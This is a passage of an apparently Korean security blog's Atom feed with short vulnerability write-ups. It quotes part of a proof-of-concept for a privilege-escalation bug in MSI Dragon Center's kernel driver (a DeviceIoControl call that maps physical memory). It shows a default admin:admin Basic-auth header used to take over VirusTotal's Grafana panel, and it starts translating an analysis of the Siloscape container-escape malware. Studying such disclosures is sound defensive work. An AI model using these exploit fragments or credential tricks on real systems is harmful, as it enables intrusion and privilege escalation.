&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBBF8; &#xB2EB;&#xD788;&#xACE0; &#xD574;&#xC81C;&#xB41C; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD574; &#xC791;&#xC5C5;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC740; Use-after-free &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xB85C;&#xCEEC; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80; &#xACF5;&#xACA9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>uaf</tag>
      
      <tag>Fabu1ous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-29337: MSI Dragon Center의 로컬 권한 상승 취약점</title>
    <link href="/2021/06/22/l0ch/2021-06-22/"/>
    <url>/2021/06/22/l0ch/2021-06-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rjt-gupta/CVE-2021-29337">CVE-2021-29337 - Privilege Escalation in MODAPI.sys (MSI Dragon Center)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MSI Dragon Center 2.0.104.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>LED &#xC2DC;&#xC2A4;&#xD15C;, &#xC2DC;&#xC2A4;&#xD15C; &#xD658;&#xACBD; &#xC124;&#xC815;, &#xBAA8;&#xBC14;&#xC77C; &#xC571; &#xC6D0;&#xACA9; &#xC81C;&#xC5B4; &#xB4F1;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; MSI&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;&#xC778; Dragon Center&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC758; PoC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; Dragon Center&#xC758; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84; <code>MODAPI.sys</code>&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBA70; PoC&#xC758; &#xC77C;&#xBD80; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">//Allocate Input Buffer</span>LPVOID lpInMemoryArea = VirtualAlloc((LPVOID)<span class="hljs-number">0x41000000</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);LPVOID lpOutMemoryArea = VirtualAlloc((LPVOID)<span class="hljs-number">0x42000000</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<span class="hljs-comment">//Set Input Buffer</span>DWORD pPhysicalMemAddr = <span class="hljs-number">0xE0000</span>;DWORD dwDataSizeToRead = <span class="hljs-number">0x4</span>;DWORD dwAmountOfDataToRead = <span class="hljs-number">8</span>;memmove(lpInMemoryArea, &amp;pPhysicalMemAddr, <span class="hljs-keyword">sizeof</span>(DWORD));memmove((BYTE*)lpInMemoryArea + <span class="hljs-number">0x8</span>, &amp;dwDataSizeToRead, <span class="hljs-keyword">sizeof</span>(DWORD));memmove((BYTE*)lpInMemoryArea + <span class="hljs-number">0xC</span>, &amp;dwAmountOfDataToRead, <span class="hljs-keyword">sizeof</span>(DWORD));<span class="hljs-comment">// Send IOCTL</span>DWORD dwLastError = DeviceIoControl(hDriver, <span class="hljs-number">0x9C406104</span>, lpInMemoryArea, <span class="hljs-number">0x10</span>, lpOutMemoryArea, <span class="hljs-number">0x40</span>, &amp;dwBytesOut, <span class="hljs-literal">NULL</span>);</code></pre><p><code>MODAPI.sys</code>&#xC758; METHOD_BUFFERED IOCTL <code>0x9C406104</code> &#xB294; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC5D0; &#xB9E4;&#xD551;&#xD558;&#xB294; <code>MmMapIoSpace</code> &#xB8E8;&#xD2F4;&#xC744; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xD574;&#xCEE4;&#xAC00; Input Buffer&#xC778; <code>lpInMemoryArea</code> &#xC5D0; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xC704;&#xD55C; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC744; &#xC124;&#xC815;&#xD55C; &#xB4A4; <code>DeviceIoControl</code>&#xC744; &#xD1B5;&#xD574; IOCTL &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; Windows&#xC758; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC758; &#xB370;&#xC774;&#xD130;&#xB85C; &#xC784;&#xC758;&#xB85C; &#xC870;&#xC791; &#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC774;&#xB294; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>windows</tag>
      
      <tag>msi</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>kernel driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] VirusTotal Grafana Admin Panel bypass</title>
    <link href="/2021/06/21/idioth/2021-06-21/"/>
    <url>/2021/06/21/idioth/2021-06-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://infosecwriteups.com/grafana-admin-panel-bypass-in-google-acquisition-virustotal-c5ecc9d7b8ae">Grafana Admin Panel bypass in Google Acquisition(VirusTotal)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>grafana.internal.virustotal.com</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xAD6C;&#xAE00;&#xC774; &#xC778;&#xC218;&#xD55C; VirusTotal&#xC758; &#xC11C;&#xBE0C; &#xB3C4;&#xBA54;&#xC778; grafana.internal.virustotal.com&#xC5D0;&#xC11C; Admin Panel&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Grafana&#xB294; &#xB2E4;&#xC911; &#xD50C;&#xB7AB;&#xD3FC; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xBD84;&#xC11D; &#xBC0F; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xC194;&#xB8E8;&#xC158;&#xC73C;&#xB85C;, &#xD574;&#xB2F9; &#xB3C4;&#xBA54;&#xC778;&#xC740; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xC73C;&#xBA74; grafana &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xAC70;&#xB098; &#xC0C8;&#xB85C;&#xC6B4; &#xACC4;&#xC815; &#xC0DD;&#xC131;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. (Google, Github &#xB4F1; &#xB2E4;&#xB978; &#xACC4;&#xC815; &#xC774;&#xC6A9; &#xD3EC;&#xD568;)</p><p>Grafana&#xC5D0;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC218;&#xC815;, &#xCD94;&#xAC00;&#xD558;&#xACE0; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xB9CC; &#xC77C;&#xBD80; &#xAE30;&#xB2A5;&#xC740; &#xAD00;&#xB9AC;&#xC790;&#xB9CC;&#xC774; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Grafana&#xC5D0;&#xC11C; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xBBFC;&#xAC10;&#xD55C; request&#xC758; &#xAE30;&#xBCF8; &#xC778;&#xC99D; &#xD5E4;&#xB354;&#xB294; <code>Authorization: Basic YWRtaW46YWRtaW4=</code>&#xC778;&#xB370; base64&#xB85C; decode&#xD558;&#xBA74; <code>admin:admin</code>&#xC774; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xAD00;&#xB9AC;&#xC790;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD55C; &#xD6C4; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; &#xC0C8; &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xC804;&#xCCB4;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; Admin Panel&#xC5D0;&#xC11C; VirusTotal &#xB0B4;&#xBD80; &#xD154;&#xB808;&#xADF8;&#xB7A8; &#xADF8;&#xB8F9;&#xC5D0; &#xC54C;&#xB9BC;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xD154;&#xB808;&#xADF8;&#xB7A8; API &#xD0A4;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBD07;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD154;&#xB808;&#xADF8;&#xB7A8; &#xADF8;&#xB8F9;&#xC758; &#xBAA8;&#xB4E0; &#xC0AC;&#xB78C;&#xC5D0;&#xAC8C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>api.telegram.org<span class="hljs-regexp">/bot_API_KEY/</span>sendMessage?chat_id=userid&amp;text= SOME_URL_ENCODED_TEXT</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>google</tag>
      
      <tag>grafana</tag>
      
      <tag>virustotal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Siloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments</title>
    <link href="/2021/06/20/idioth/siloscape/"/>
    <url>/2021/06/20/idioth/siloscape/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. idioth&#xC785;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798; &#xC624;&#xB298;&#xC740; ghidra&#xC758; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xAC00; &#xB098;&#xC624;&#xB294; &#xB0A0;&#xC774;&#xC8E0;. &#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xC0AC;&#xC815;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC88;&#xC5ED;&#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC5B4;&#xC694;.</p><p>&#xC544;&#xC9C1; &#xC800;&#xB294; &#xAE30;&#xB9D0; &#xC2DC;&#xD5D8;&#xC774; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC558;&#xACE0; &#xB610; &#xC0AC;&#xBB34;&#xC2E4;&#xC5D0; &#xC788;&#xB294; &#xB178;&#xD2B8;&#xBD81;&#xC5D0; &#xBD84;&#xC11D;&#xD55C; VM&#xC774; &#xC7A0;&#xB4E4;&#xC5B4; &#xC788;&#xB294;&#xB370; &#xC5B4;&#xC81C; &#xBC1C;&#xC5D0; &#xB808;&#xC774;&#xC800; &#xCE58;&#xB8CC;&#xB97C; &#xBC1B;&#xC740; &#xD0D3;&#xC5D0; &#xC798; &#xAC77;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xC788;&#xB2F5;&#xB2C8;&#xB2E4; &#xD558;&#xD558;&#xD558;. &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xBC1C; &#xB4A4;&#xAFC8;&#xCE58;&#xB85C; &#xAC77;&#xB294; &#xAC70; &#xD560;&#xB9CC;&#xD574;&#xC694; ^^&#x2026;.</p><p>&#xC544;&#xBB34;&#xD2BC; &#xC774;&#xB7F0;&#xC800;&#xB7F0; &#xC774;&#xC720;&#xB85C; &#xAE30;&#xB9D0; &#xC900;&#xBE44; &#xC911;&#xC778; &#xC800;&#xC5D0;&#xAC8C; &#xC2F8;&#xC7A5;&#xB2D8;&#xAED8;&#xC11C; &#xC77D;&#xC73C;&#xB77C;&#xACE0; &#xCD94;&#xCC9C;&#xD574;&#xC8FC;&#xC2E0; &#xAE00;&#xC744; &#xC77D;&#xC744; &#xACB8; &#xBC88;&#xC5ED;&#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;! &#xD6C4;&#xBC18;&#xBD80;&#xC5D0; &#xBE80; &#xBD80;&#xBD84;&#xC774; &#xC870;&#xAE08; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! Siloscape&#xC758; &#xD589;&#xC704;&#xB97C; &#xBCF4;&#xACE0; &#xC2F6;&#xC5B4;&#xC11C; IRC &#xC811;&#xC18D; &#xBD80;&#xBD84;&#xC740; &#xC81C;&#xC678;&#xD558;&#xACE0; &#xBC88;&#xC5ED;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. :)</p><blockquote><p>&#xC6D0;&#xBB38; &#xAE00; : <a href="https://unit42.paloaltonetworks.com/siloscape/">Siloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments</a></p></blockquote><h1 id="Executive-Summary"><a href="#Executive-Summary" class="headerlink" title="Executive Summary"></a>Executive Summary</h1><p>2021&#xB144; 3&#xC6D4;&#xC5D0; Windows container&#xB97C; &#xD0C0;&#xAE43;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xCD5C;&#xCD08;&#xC758; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;. &#xC9C0;&#xB09C; &#xBA87; &#xB144;&#xAC04; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xB97C; &#xD0C0;&#xAE43;&#xC73C;&#xB85C; &#xD55C; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xAC00; &#xC99D;&#xAC00;&#xD55C; &#xAC83;&#xC744; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xB180;&#xB78D;&#xC9C0;&#xB294; &#xC54A;&#xB2E4;. &#xC774; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB294; container escape&#xAC00; &#xC8FC;&#xBAA9;&#xC801;&#xC774;&#xACE0; &#xC8FC;&#xB85C; server silo&#xB97C; &#xD1B5;&#xD574; Windows&#xC5D0;&#xC11C; &#xAD6C;&#xD604;&#xB418;&#xBBC0;&#xB85C; Siloscape (silo escape&#xCC98;&#xB7FC; &#xB4E4;&#xB9BC; &#x314E;)&#xB77C;&#xACE0; &#xC774;&#xB984; &#xC9C0;&#xC5C8;&#xB2E4;.</p><p>Siloscape&#xB294; Windows container&#xB97C; &#xD1B5;&#xD574; Kubernetes clusters&#xB97C; &#xD0C0;&#xAE43;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC774;&#xB2E4;. &#xC8FC;&#xBAA9;&#xC801;&#xC740; &#xC545;&#xC131; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xCDE8;&#xC57D;&#xD55C; Kubernetes clusters&#xC5D0; &#xBC31;&#xB3C4;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xAC01; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB294; &#xD558;&#xB098;&#xC758; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBC18;&#xBA74;&#xC5D0; &#xD558;&#xB098;&#xC758; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB294; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xAC1C;&#xBCC4; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB97C; &#xC190;&#xC0C1;&#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; &#xC804;&#xCCB4; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB97C; &#xC190;&#xC0C1;&#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xC774; &#xB354; &#xCE58;&#xBA85;&#xC801;&#xC774;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; &#xD574;&#xCEE4;&#xAC00; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984; &#xBC0F; &#xC554;&#xD638;, &#xC870;&#xC9C1;&#xC758; &#xAE30;&#xBC00; &#xC815;&#xBCF4;&#xC640; &#xB0B4;&#xBD80; &#xD30C;&#xC77C; &#xB610;&#xB294; &#xD074;&#xB7EC;&#xC2A4;&#xD161; &#xD638;&#xC2A4;&#xD305; &#xB41C; &#xC804;&#xCCB4; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC640; &#xAC19;&#xC740; &#xC911;&#xC694; &#xC815;&#xBCF4;&#xB97C; &#xD6D4;&#xCE60; &#xC218; &#xC788;&#xB2E4;. &#xD574;&#xCEE4;&#xAC00; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC870;&#xC9C1;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC778;&#xC9C8;&#xB85C; &#xC7A1;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xB2E4;. &#xB354; &#xC2EC;&#xAC01;&#xD55C; &#xAC83;&#xC740; &#xB9CE;&#xC740; &#xC870;&#xC9C1;&#xB4E4;&#xC774; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xB85C; &#xC774;&#xC804;&#xD558;&#xBA74;&#xC11C; &#xAC1C;&#xBC1C;, &#xD14C;&#xC2A4;&#xD2B8; &#xD658;&#xACBD;&#xC73C;&#xB85C; Kubernetes clusters&#xB97C; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC810;&#xC5D0;&#xC11C; &#xAD11;&#xBC94;&#xC704;&#xD55C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xACF5;&#xAE09;&#xB9DD; &#xACF5;&#xACA9;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.</p><p>Siloscape&#xB294; C2 (Command and Cotrol) &#xC11C;&#xBC84;&#xC5D0; &#xC775;&#xBA85;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD1A0;&#xB974; &#xD504;&#xB85D;&#xC2DC;&#xC640; <code>.onion</code> &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. 23&#xAC1C;(&#xBA85;?, &#xAE30;&#xAD00;&#xC778;&#xC9C0; &#xC0AC;&#xB78C;&#xC778;&#xC9C0; &#xC560;&#xB9E4;&#xD558;&#xB124;&#xC694;)&#xC758; &#xD53C;&#xD574;&#xC790;&#xB97C; &#xCC3E;&#xC558;&#xACE0; &#xCD1D; 313&#xBA85;&#xC758; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xD638;&#xC2A4;&#xD305; &#xD558;&#xB294;&#xB370; &#xC11C;&#xBC84;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;. &#xC774;&#xB294; Siloscape&#xAC00; &#xCEA0;&#xD398;&#xC778;&#xC758; &#xBE59;&#xC0B0;&#xC758; &#xC77C;&#xAC01;&#xC774;&#xB77C;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xC54C;&#xB824;&#xC900;&#xB2E4;. &#xD544;&#xC790;&#xB294; &#xB610;&#xD55C; &#xC774; &#xCEA0;&#xD398;&#xC778;&#xC774; 1&#xB144; &#xC774;&#xC0C1; &#xC9C0;&#xC18D;&#xB418;&#xC5B4; &#xC654;&#xC74C;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;.</p><p>&#xC774; &#xB9AC;&#xD3EC;&#xD2B8;&#xB294; Windows container &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xBC30;&#xACBD; &#xC9C0;&#xC2DD;, Siloscape&#xC758; &#xAE30;&#xC220; &#xAC1C;&#xC694;, Windows container &#xBCF4;&#xC548; &#xAD8C;&#xC7A5; &#xC0AC;&#xD56D;&#xC744; &#xC81C;&#xACF5;&#xD55C;&#xB2E4;.</p><h1 id="Windows-Server-Container-&#xCDE8;&#xC57D;&#xC810;-&#xAC1C;&#xC694;"><a href="#Windows-Server-Container-&#xCDE8;&#xC57D;&#xC810;-&#xAC1C;&#xC694;" class="headerlink" title="Windows Server Container &#xCDE8;&#xC57D;&#xC810; &#xAC1C;&#xC694;"></a>Windows Server Container &#xCDE8;&#xC57D;&#xC810; &#xAC1C;&#xC694;</h1><p>2020&#xB144; 7&#xC6D4; 15&#xC5D0; <a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">Windows container boundaries&#xC5D0; &#xAD00;&#xD55C; &#xAC8C;&#xC2DC;&#xAE00;</a>&#xACFC; &#xC5B4;&#xB5BB;&#xAC8C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xC791;&#xC131;&#xD588;&#xB2E4;. &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB97C; escape &#xD558;&#xB294; &#xAE30;&#xC220;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xACE0; &#xD574;&#xCEE4;&#xAC00; escape &#xD560; &#xC218; &#xC788;&#xB294; &#xC704;&#xD5D8;&#xC774; &#xC788;&#xB294; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xB300;&#xD574; &#xC774;&#xC57C;&#xAE30;&#xD588;&#xB2E4;. &#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD55C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; Kubernetes&#xC758; Windows container node&#xB97C; &#xD0C8;&#xCD9C;&#xD558;&#xC5EC; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB97C; &#xD655;&#xC0B0;&#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xC774;&#xC5C8;&#xB2E4;.</p><p>&#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C; Windows Server container&#xB294; &#xBCF4;&#xC548; &#xAE30;&#xB2A5;&#xC774; &#xC544;&#xB2C8;&#xB77C;&#xB294; &#xC774;&#xC720;&#xB85C; &#xC774; &#xC774;&#xC288;&#xB97C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC0DD;&#xAC01;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAC01;&#xAC01;&#xC758; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xCC98;&#xB9AC;&#xB418;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xBA87; &#xC8FC; &#xD6C4;, Kubernetes&#xAC00; &#xC774;&#xB7EC;&#xD55C; &#xC774;&#xC288;&#xC5D0; &#xCDE8;&#xC57D;&#xD558;&#xB2E4;&#xACE0; &#xAD6C;&#xAE00;&#xC5D0; &#xC804;&#xB2EC;&#xD588;&#xB2E4;. &#xAD6C;&#xAE00;&#xC740; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xC600;&#xACE0; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xB294; &#xC774; &#xC774;&#xC288;&#xB97C; Windows container&#xC5D0;&#xC11C; &#xD638;&#xC2A4;&#xD2B8;&#xB85C; escape &#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xACB0;&#xC815;&#xD558;&#xC600;&#xC9C0;&#xB9CC; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C; &#xC5C6;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xAC04;&#xC8FC;&#xB41C;&#xB2E4;.</p><p>&#xADF8; &#xD6C4;&#xC5D0; Windows Server container&#xB97C; &#xD0C0;&#xAE43;&#xC73C;&#xB85C; &#xD55C; &#xC545;&#xC131;&#xCF54;&#xB4DC; Siloscape&#xB97C; &#xBC1C;&#xACAC;&#xD558;&#xC600;&#xB2E4;. Siloscape&#xB294; Hyper-V&#xAC00; &#xC544;&#xB2CC; Server Container&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Kubernetes&#xC744; &#xD0C0;&#xAE43;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xB09C;&#xB3C5;&#xD654;&#xB41C; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC774;&#xBA70; &#xC8FC;&#xBAA9;&#xC801;&#xC740; &#xC124;&#xC815;&#xC774; &#xBBF8;&#xD761;&#xD55C; Kubernetes &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC5D0; &#xBC31;&#xB3C4;&#xC5B4;&#xB97C; &#xC5F4;&#xC5B4; &#xC554;&#xD638; &#xD654;&#xD3D0; &#xCC44;&#xAD74;&#xACFC; &#xAC19;&#xC740; &#xC545;&#xC131; container&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC758; &#xB3D9;&#xC791;&#xACFC; &#xAE30;&#xC220;&#xC5D0; &#xB300;&#xD55C; &#xD2B9;&#xC9D5;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;:</p><ul><li>&#xC54C;&#xB824;&#xC9C4; &#xCDE8;&#xC57D;&#xC810; (1-day)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD0C0;&#xAE43; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; 